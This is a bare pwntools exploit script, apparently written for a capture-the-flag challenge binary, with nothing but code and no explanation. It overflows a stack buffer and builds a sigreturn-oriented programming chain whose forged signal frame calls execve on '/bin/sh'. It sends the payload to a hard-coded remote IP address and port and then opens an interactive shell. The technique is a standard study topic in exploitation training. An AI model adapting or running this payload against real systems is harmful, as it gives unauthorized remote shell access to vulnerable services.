import pwn
import time

pwn.context.binary = elf = pwn.ELF("./chall")
rop = pwn.ROP(elf)

if pwn.args.REMOTE:
    # io = pwn.remote("localhost", 1024)
    io = pwn.remote("35.224.47.193", 1024)
else:
    io = pwn.process("./chall")

if pwn.args.GDB:
    pwn.gdb.attach(
        io,
        gdbscript="""
break *main+77
continue
""",
    )

# 0x0000000000401157: syscall; ret;
syscall_ret = 0x401157

offset = 136
p = pwn.cyclic(offset)
# p += pwn.p64(0xdeadbeef)

s = pwn.SigreturnFrame()
s.rax = pwn.constants.SYS_execve
s.rdi = next(elf.search(b"/bin/sh"))
s.rsi = 0
s.rdx = 0
s.rip = syscall_ret
bytes(s)

p += pwn.p64(rop.rax.address)
p += pwn.p64(15)
p += pwn.p64(syscall_ret)
p += bytes(s)

io.sendlineafter("TODAY\n", p)
io.interactive()
